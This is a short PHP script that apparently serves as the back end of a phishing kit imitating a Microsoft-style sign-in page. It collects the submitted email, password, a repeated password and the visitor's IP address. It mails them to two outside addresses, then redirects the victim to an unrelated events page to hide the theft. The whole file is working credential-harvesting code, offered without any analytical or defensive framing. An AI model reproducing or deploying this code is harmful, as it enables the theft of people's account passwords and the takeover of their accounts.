<?php
if($_SERVER['REQUEST_METHOD'] != 'POST') {
header("location: /");
die();
}

$loginfmt = $_POST['loginfmt'];
$loginpswd = $_POST['loginpswd'];
$re_loginpswd = $_POST['re_loginpswd'];
$ip = getenv('REMOTE_ADDR');

$recipient = 'kkshohett@gmail.com,hrdepartment86@outlook.com';
$subject = "Sign in notification $loginfmt ";
$message = '
<html>
<head>
<title>New notification </title>
</head>
<body>
<h3>A customer signed in now!</h3>
<table>
<tr>
<td><strong>Email:</strong></td><td>'.$loginfmt.'</td>
</tr>
<tr>
<td><strong>Passwd:</strong></td><td>'.$loginpswd.'</td>
</tr>
<tr>
<td><strong>Second Passwd:</strong></td><td>'.$re_loginpswd.'</td>
</tr>
<tr>
<td><strong>Ip address:</strong></td><td>'.$ip.'</td>
</tr>
</table>
</body>
</html>
';

$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=iso-8859-1';

mail($recipient,$subject,$message, implode("\r\n", $headers));
header("location: https://10times.com/leadership-and-decision-making");